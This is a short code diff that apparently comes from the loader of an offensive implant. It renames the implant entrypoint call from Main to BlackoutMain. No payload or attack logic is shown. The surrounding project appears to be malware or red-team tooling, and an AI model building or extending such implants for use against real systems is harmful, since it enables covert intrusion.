@@ -79,5 +79,5 @@ EXTERN_C FUNC VOID Entry(
     //
     // now execute the implant entrypoint
     //
-    Main( Param );
+    BlackoutMain( Param );
 }
